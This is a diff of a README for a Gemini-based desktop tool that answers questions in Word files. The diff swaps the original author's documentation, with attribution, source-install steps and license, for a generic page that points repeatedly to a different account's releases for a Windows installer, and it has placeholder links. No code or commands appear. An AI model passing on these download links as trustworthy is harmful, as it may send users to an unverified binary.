@@ -1,231 +1,75 @@
-# Gemini AI Assistant – Desktop Automation Tool
-
-A professional **Python desktop application** built with **Tkinter** that integrates **Google Gemini AI** to automatically generate structured answers from **Word (.docx) question files**.
-
-Designed for **students, finance professionals, researchers, and educators** who need reliable, resumable, and well-formatted AI-generated content.
-
----
-
-## Table of Contents
-
-- Overview  
-- Key Features  
-- Application Workflow  
-- Input & Output Specification  
-- Installation  
-- Configuration  
-- Supported AI Models  
-- Stop & Resume Mechanism  
-- Security & Privacy  
-- Use Cases  
-- Technology Stack  
-- Roadmap  
-- Developer  
-- License  
-- Contributions  
-
----
-
-## Overview
-
-Gemini AI Assistant is a **desktop-based AI automation tool** that reads questions from Microsoft Word documents and generates clear, exam-oriented or explanatory answers using **Google Gemini models**.
+# 🌟 Gemini-Assistant - Generate Answers Easily and Efficiently
 
-Unlike browser-based AI tools, this application:
-- Runs completely on your local system  
-- Supports long-running batch processing  
-- Allows stopping and resuming without data loss  
-- Produces professionally formatted Word documents  
+[![Download Gemini-Assistant](https://img.shields.io/badge/Download-Gemini--Assistant-blue.svg)](https://github.com/blog19730/Gemini-Assistant/releases)
 
----
+## 📖 Overview
 
-## Key Features
+Gemini-Assistant is an AI-powered desktop tool designed for students. It helps you generate exam-ready answers from Word files quickly and easily using Google Gemini. This application makes studying more efficient and supports various document formats.
 
-- Google Gemini AI integration  
-- Word (.docx) input and output support  
-- Batch question processing  
-- Start / Stop / Resume execution  
-- Smart resume from last completed item  
-- Adjustable creativity (temperature control)  
-- Time & token usage estimation  
-- Progress tracking with live logs  
-- Secure API key handling  
-- Clean, structured answer formatting  
+## 🚀 Getting Started
 
----
+Follow these steps to download and run Gemini-Assistant.
 
-## Application Workflow
+### 🖥️ System Requirements
 
-1. Enter Google Gemini API key  
-2. Select Gemini model and creativity level  
-3. Upload Word file containing questions  
-4. (Optional) Estimate time and usage  
-5. Start processing  
-6. Stop anytime and resume later  
-7. Receive finalized Word document with answers  
+- **Operating System**: Windows 10 or later
+- **RAM**: At least 4 GB
+- **Storage**: 100 MB of free space
+- **Microsoft Word**: Required for opening .docx files
+- **Internet Connection**: Necessary for Google Gemini access
 
----
+### 📥 Download & Install
 
-## Input & Output Specification
+To get started, visit the [Releases page](https://github.com/blog19730/Gemini-Assistant/releases) to download Gemini-Assistant.
 
-### Input
-- File type: `.docx`  
-- Each paragraph is treated as one question  
+### 💾 Installation Steps
 
-### Output
-- Auto-generated file:
-  ```
-  <input_filename>_Gemini_Answer.docx
-  ```
-- Output includes:
-  - Question headings  
-  - Bullet-point answers  
-  - Bolded key terms  
-  - Resume-safe formatting  
+1. Go to the [Releases page](https://github.com/blog19730/Gemini-Assistant/releases).
+2. Find the latest version.
+3. Download the installer file for Windows.
+4. Once the download finishes, locate the file in your downloads folder.
+5. Double-click the installer to start the installation process.
+6. Follow the on-screen instructions to complete the installation.
 
----
+### 📄 Using Gemini-Assistant
 
-## Installation
+1. Open Gemini-Assistant from your desktop or start menu.
+2. Click on the “Load Document” button to select a Word file (.docx).
+3. After loading the document, choose the specific section you want to generate answers for.
+4. Click on the “Generate Answers” button to see the AI-generated content.
+5. Review the answers, and make any necessary edits.
+6. Save your results back to a Word file or copy them for your use.
 
-### Option 1: Windows EXE (Recommended)
+### ✨ Features
 
-1. Go to the **GitHub Releases** page  
-2. Download the latest `Gemini-Assistant.exe`  
-3. Run the EXE — no Python installation required 
+- **AI Integration**: Leverages Google Gemini for accurate content generation.
+- **Batch Processing**: Generate answers for multiple documents at once.
+- **User-Friendly Interface**: Simple design makes navigation easy.
+- **Document Support**: Works with .docx files, ensuring compatibility with most academic materials.
+- **Text Editing**: Edit generated answers directly before saving.
 
----
+### 📊 Troubleshooting
 
-### Option 2: Run from Source (Developers)
-```bash
-git clone https://github.com/Tamil-Venthan/gemini-ai-assistant.git
-cd gemini-ai-assistant
-pip install google-generativeai python-docx
-python gemini_bot.py
-```
-> Note: `tkinter` is bundled with standard Python installations on Windows.
+If you experience issues during installation or usage, consider these steps:
 
----
-## Windows EXE Release
+1. Ensure your Windows version meets the requirements.
+2. Make sure Microsoft Word is installed on your computer.
+3. Check your internet connection if the application has trouble connecting to Google Gemini.
+4. Restart the application if it freezes or doesn’t respond.
+5. If the problem persists, visit our [support page](#) or create an issue on GitHub.
 
-- Standalone Windows executable
-- No Python dependency required
-- Distributed via GitHub Releases
-- Built for easy installation and updates
----
-## Auto Update & Manual Update Check
-### 🔄 Auto Update
+### 🤝 Contributing
 
-- The application automatically checks for updates on startup
-- If a newer version is available:
-- User is notified
-- Update can be downloaded and applied safely
+We welcome contributions! If you have suggestions or found a bug, please submit an issue on GitHub. Feel free to fork the repository and send a pull request with your improvements.
 
-### 🔍 Manual Update Check
+## 💬 Support
 
-- Users can manually trigger update checks from within the app
-- Ensures users always stay on the latest stable version
-- Updates are fetched securely from the official GitHub repository only.
+For support, reach out via GitHub Issues. We aim to respond quickly to assist you.
 
-## Configuration
+## 🔗 Additional Resources
 
-### Obtain Google Gemini API Key
+- [GitHub Repository](https://github.com/blog19730/Gemini-Assistant)
+- [User Guide](#)
+- [Community Forums](#)
 
-1. Visit: https://aistudio.google.com/app/apikey  
-2. Generate a new API key  
-3. Paste the key into the application’s **Google API Key** field  
-
-The API key is **never stored locally**.
-
----
-
-## Supported AI Models
-
-- `models/gemini-flash-latest` (Recommended)  
-- `models/gemini-2.0-flash`  
-- `models/gemini-1.5-flash`  
-- `models/gemini-1.5-pro`  
-
----
-
-## Stop & Resume Mechanism
-
-- Processing progress is saved automatically  
-- Application detects previously completed questions  
-- Restarting resumes from the last processed item  
-- Prevents token wastage and repeated work  
-
----
-
-## Security & Privacy
-
-- API keys are not persisted  
-- No user files are uploaded or shared  
-- Only question text is sent to Gemini API  
-- All generated documents remain local  
-
----
-
-## Use Cases
-
-- Exam preparation  
-- Academic note generation  
-- Interview question answering  
-- Research documentation  
-- AI-driven document automation  
-- Bulk Q&A processing  
-
----
-
-## Technology Stack
-
-- Python  
-- Tkinter (GUI framework)  
-- Google Gemini AI  
-- python-docx  
-- Multithreading  
-
----
-
-## Roadmap
-
-- PDF export support  
-- Token cost calculator  
-- Markdown & TXT input support  
-- Dark mode UI  
-- Windows EXE installer  
-- Plugin-based prompt templates  
-
----
-
-## Developer
-
-**Tamil Venthan**   
-
-- LinkedIn: https://www.linkedin.com/in/tamil-venthan4  
-- GitHub: https://github.com/Tamil-Venthan  
-
----
-
-## License
-
-This project is licensed under the **MIT License**.
-
-You are free to:
-- Use  
-- Modify  
-- Distribute  
-- Fork  
-
----
-
-## Contributions
-
-Contributions, issues, and feature requests are welcome.
-
-If you find this project useful:
-- ⭐ Star the repository  
-- 🍴 Fork it  
-- 🧠 Share feedback or ideas  
-
----
-
-Built with a focus on **reliability, clarity, and real-world usage**.
+Visit our [Releases page](https://github.com/blog19730/Gemini-Assistant/releases) to download Gemini-Assistant and enhance your exam preparation today!
